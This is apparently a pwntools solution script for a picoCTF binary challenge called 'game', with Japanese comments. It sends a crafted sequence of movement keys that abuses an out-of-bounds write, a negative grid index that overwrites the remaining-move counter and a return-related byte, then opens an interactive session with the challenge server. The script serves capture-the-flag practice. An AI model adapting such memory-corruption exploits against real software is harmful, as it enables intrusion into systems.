from pwn import *

exe = ELF('./game')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        b *move_player
        continue
    """)
elif args.REMOTE:
    io = remote("rhea.picoctf.net", 53633)

payload = b''
for _ in range(4):
    # 手数を増やす
    payload += b'w' * 5
    payload += b'a' * 5
    payload += b's'
    payload += b'a' * 4
    # 戻ってくる
    payload += b'd' * 4
    payload += b'w'
    payload += b'd' * 5
    payload += b's' * 5
    # (0, 39) へ
    payload += b'w' * 4
    payload += b'd' * 35
    payload += b'l\x7f'
    payload += b'w' * 1

# 手数を増やす
payload += b'w' * 5
payload += b'a' * 5
payload += b's'
payload += b'a' * 4
# 戻ってくる
payload += b'd' * 4
payload += b'w'
payload += b'd' * 5
payload += b's' * 5
# (0, 39) へ
payload += b'w' * 4
payload += b'd' * 35
payload += b'l\xfe'
payload += b'w' * 1

io.sendline(payload)
io.interactive() 



# wwwwwaaaaas

# *(_BYTE *)(a1[1] + a3 + 90 * *a1) = player_tile;
# x + a3 + 90 * y
# 例えば、y == 0, x == -10 みたいにすると、残り手数を上書きできる
# 90 + a3 + 90 * (-1)

# wwwwwaaaaasaaaasp
# wwwwwaaaaasaaaaaa

